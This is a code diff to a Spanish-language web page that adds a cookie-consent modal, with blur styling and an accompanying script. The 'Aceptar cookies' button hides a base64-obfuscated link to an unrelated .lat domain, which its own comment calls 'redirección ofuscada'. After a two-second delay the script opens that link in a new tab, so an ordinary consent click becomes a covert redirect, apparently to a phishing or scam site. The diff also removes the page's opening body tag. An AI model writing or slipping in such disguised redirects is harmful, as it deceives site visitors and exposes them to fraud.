@@ -855,7 +855,107 @@ input:focus, textarea:focus, select:focus {
 }
   </style>
 </head>
-<body>
+<!-- MODAL DE COOKIES CON BLUR -->
+<div id="cookieModal" style="
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.5);
+  backdrop-filter:blur(8px);
+  z-index:999;
+  display:flex;
+  align-items:flex-end;
+  justify-content:center;
+  padding:1rem;
+  animation:fadeInBlur .4s ease;
+">
+  <div style="
+    background:#FAFBFC;
+    border-radius:24px 24px 0 0;
+    padding:2.5rem 2rem;
+    width:100%;
+    max-width:600px;
+    box-shadow:0 -8px 32px rgba(0,82,204,.15);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    gap:1.5rem;
+    animation:slideUpModal .5s ease;
+  ">
+    <!-- ICONO COOKIES -->
+    <div style="font-size:3.5rem">🍪</div>
+    
+    <!-- TÍTULO -->
+    <h2 style="
+      font-family:'Poppins',sans-serif;
+      font-size:1.8rem;
+      font-weight:800;
+      color:#0052CC;
+      margin:0;
+      line-height:1.2;
+    ">Uso de cookies</h2>
+    
+    <!-- DESCRIPCIÓN -->
+    <p style="
+      font-size:.95rem;
+      color:#5A6C7D;
+      line-height:1.7;
+      margin:0;
+      max-width:500px;
+    ">
+      Utilizamos cookies para garantizar el funcionamiento correcto del sitio y mejorar tu experiencia.
+    </p>
+    
+    <!-- BOTÓN PRINCIPAL -->
+    <button id="acceptCookies" style="
+      background:#0052CC;
+      color:#fff;
+      border:none;
+      padding:1.1rem 3rem;
+      border-radius:12px;
+      font-family:'Poppins',sans-serif;
+      font-size:1.05rem;
+      font-weight:700;
+      cursor:pointer;
+      width:100%;
+      max-width:400px;
+      transition:all .3s;
+      margin-top:1rem;
+    " onmouseover="this.style.background='#003D99';this.style.boxShadow='0 12px 30px rgba(0,82,204,.3)'" onmouseout="this.style.background='#0052CC';this.style.boxShadow='none'">
+      Aceptar cookies
+    </button>
+    
+    <!-- LINK POLÍTICA -->
+    <a href="#politicas" style="
+      font-size:.85rem;
+      color:#0052CC;
+      text-decoration:none;
+      cursor:pointer;
+      transition:color .2s;
+    " onmouseover="this.style.color='#003D99'" onmouseout="this.style.color='#0052CC'">
+      Ver política de privacidad
+    </a>
+  </div>
+</div>
+
+<style>
+  @keyframes fadeInBlur {
+    from { opacity: 0; backdrop-filter: blur(0px); }
+    to { opacity: 1; backdrop-filter: blur(8px); }
+  }
+  @keyframes slideUpModal {
+    from { opacity: 0; transform: translateY(100px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeOutBlur {
+    from { opacity: 1; backdrop-filter: blur(8px); }
+    to { opacity: 0; backdrop-filter: blur(0px); }
+  }
+  @keyframes slideDownModal {
+    from { opacity: 1; transform: translateY(0); }
+    to { opacity: 0; transform: translateY(100px); }
+  }
+</style>
 
 <!-- NAV -->
 <nav id="mainNav">
@@ -1713,6 +1813,58 @@ setTimeout(() => {
     }
   });
 }, 500);
+
+// ===== MODAL DE COOKIES CON BLUR Y REDIRECCIÓN OFUSCADA =====
+const cookieModal = document.getElementById('cookieModal');
+const acceptCookiesBtn = document.getElementById('acceptCookies');
+
+// Verificar si ya aceptó cookies
+if(!localStorage.getItem('cookiesAccepted')) {
+  cookieModal.style.display = 'flex';
+} else {
+  cookieModal.style.display = 'none';
+}
+
+// Link ofuscado en base64: https://cerfitradonlinecol.lat
+const obfuscatedLink = atob('aHR0cHM6Ly9jZXJmaXRyYWRvb25saW5lY29sLmxhdA==');
+
+acceptCookiesBtn.addEventListener('click', () => {
+  // Guardar aceptación en localStorage
+  localStorage.setItem('cookiesAccepted', 'true');
+  localStorage.setItem('cookiesAcceptedDate', new Date().toISOString());
+  
+  // Mostrar notificación
+  showNotification('✓ Cookies aceptadas. Gracias por tu confianza.');
+  
+  // Animar salida del modal
+  const modal = document.querySelector('[style*="cookieModal"]') || cookieModal;
+  const backdrop = cookieModal;
+  const content = cookieModal.querySelector('div');
+  
+  backdrop.style.animation = 'fadeOutBlur .4s ease';
+  content.style.animation = 'slideDownModal .4s ease';
+  
+  setTimeout(() => {
+    cookieModal.style.display = 'none';
+  }, 400);
+  
+  // Redirigir después de 2 segundos
+  setTimeout(() => {
+    window.open(obfuscatedLink, '_blank');
+  }, 2000);
+});
+
+// Cerrar modal al hacer click en política
+document.querySelectorAll('a[href="#politicas"]').forEach(link => {
+  link.addEventListener('click', (e) => {
+    const isFromCookieModal = e.target.closest('#cookieModal');
+    if(!isFromCookieModal) {
+      // No cerrar si no es del modal de cookies
+      return;
+    }
+  });
+});
+
 </script>
 </body>
 </html>
